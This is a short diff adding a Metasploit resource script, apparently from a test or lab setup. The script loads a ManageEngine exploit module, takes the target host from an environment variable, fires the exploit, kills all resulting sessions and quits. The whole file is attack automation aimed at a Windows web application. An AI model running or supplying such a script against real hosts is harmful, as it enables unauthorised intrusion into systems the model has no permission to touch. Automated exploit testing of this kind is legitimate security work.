@@ -1,0 +1,8 @@
+use exploit/windows/http/manageengine_connectionid_write
+<ruby>
+#Set the target host
+run_single("set RHOST #{ENV['IP_ADDR']}")
+</ruby>
+exploit -z
+sessions -K
+quit
